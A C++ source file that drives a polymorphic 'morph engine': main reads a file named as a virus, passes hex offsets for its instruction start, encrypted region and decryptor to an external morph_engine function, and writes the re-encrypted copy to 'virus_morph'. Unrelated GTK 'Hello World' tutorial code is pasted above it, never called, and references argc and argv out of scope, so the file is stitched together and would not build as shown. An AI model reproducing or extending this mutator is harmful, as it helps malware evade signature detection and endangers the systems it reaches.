
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <gtk/gtk.h>

extern "C" int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
using namespace std;

void hello( GtkWidget *widget,
            gpointer   data )
{
    g_print ("Hello World\n");
}

gint delete_event( GtkWidget *widget,
                   GdkEvent  *event,
                   gpointer   data )
{
    /* If you return FALSE in the "delete_event" signal handler,
     * GTK will emit the "destroy" signal. Returning TRUE means
     * you don't want the window to be destroyed.
     * This is useful for popping up 'are you sure you want to quit?'
     * type dialogs. */

    g_print ("delete event occurred\n");

    /* Change TRUE to FALSE and the main window will be destroyed with
     * a "delete_event". */

    return(TRUE);
}

/* Another callback */
void destroy( GtkWidget *widget,
              gpointer   data )
{
    gtk_main_quit();
}

int GUI(){
   /* GtkWidget is the storage type for widgets */
   GtkWidget *window;
   GtkWidget *button;

   /* This is called in all GTK applications. Arguments are parsed
    * from the command line and are returned to the application. */
   gtk_init(&argc, &argv);

   /* create a new window */
   window = gtk_window_new (GTK_WINDOW_TOPLEVEL);

   /* When the window is given the "delete_event" signal (this is given
    * by the window manager, usually by the "close" option, or on the
    * titlebar), we ask it to call the delete_event () function
    * as defined above. The data passed to the callback
    * function is NULL and is ignored in the callback function. */
   gtk_signal_connect (GTK_OBJECT (window), "delete_event",
                       GTK_SIGNAL_FUNC (delete_event), NULL);

   /* Here we connect the "destroy" event to a signal handler.
    * This event occurs when we call gtk_widget_destroy() on the window,
    * or if we return FALSE in the "delete_event" callback. */
   gtk_signal_connect (GTK_OBJECT (window), "destroy",
                       GTK_SIGNAL_FUNC (destroy), NULL);

   /* Sets the border width of the window. */
   gtk_container_set_border_width (GTK_CONTAINER (window), 10);

   /* Creates a new button with the label "Hello World". */
   button = gtk_button_new_with_label ("Hello World");

   /* When the button receives the "clicked" signal, it will call the
    * function hello() passing it NULL as its argument.  The hello()
    * function is defined above. */
   gtk_signal_connect (GTK_OBJECT (button), "clicked",
                       GTK_SIGNAL_FUNC (hello), NULL);

   /* This will cause the window to be destroyed by calling
    * gtk_widget_destroy(window) when "clicked".  Again, the destroy
    * signal could come from here, or the window manager. */
   gtk_signal_connect_object (GTK_OBJECT (button), "clicked",
                              GTK_SIGNAL_FUNC (gtk_widget_destroy),
                              GTK_OBJECT (window));

   /* This packs the button into the window (a gtk container). */
   gtk_container_add (GTK_CONTAINER (window), button);

   /* The final step is to display this newly created widget. */
   gtk_widget_show (button);

   /* and the window */
   gtk_widget_show (window);

   /* All GTK applications must have a gtk_main(). Control ends here
    * and waits for an event to occur (like a key press or
    * mouse event). */
   gtk_main ();

   return(0);
}

int main(int argc, char* argv[])
{


    if(argc != 5) {

        cout << "Invalid number of arguments!" << endl;
        return 1;
    }

	// seeding rand with current time for unique encryption
	srand(time(NULL));

	// get the arguments
	const char* virus_name = argv[1];
	const size_t virus_instruction_begin  = strtoull(argv[2], nullptr, 16);
	const size_t virus_encrypt_size    = strtoull(argv[3], nullptr, 16);
	const size_t virus_decrypt_offset  = strtoull(argv[4], nullptr, 16);


	// open the executable file
	FILE* virus_file = fopen(virus_name, "rb");
	if(!virus_file)
	{
		cout << "Error opening " <<  virus_name << endl;
		return 1;
	}

	// get the size of the executable file
	size_t virus_size;
	fseek(virus_file, 0, SEEK_END);
	virus_size = ftell(virus_file);
	rewind(virus_file);


    char* virus_data = new char[virus_size];
    fread(virus_data, virus_size, 1, virus_file);
    if(morph_engine(virus_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		cout << "Encoutered errors in the morph engine" << endl;

	}


    std::ofstream outfile ("virus_morph",std::ofstream::binary);
    // write to outfile
    outfile.write (virus_data,virus_size);



    return 0;
}

// https://stackoverflow.com/questions/22129349/reading-binary-file-to-unsigned-char-array-and-write-it-to-another
// https://stackoverflow.com/questions/43765881/c-reading-binary-files
// http://www.cplusplus.com/forum/beginner/176692/
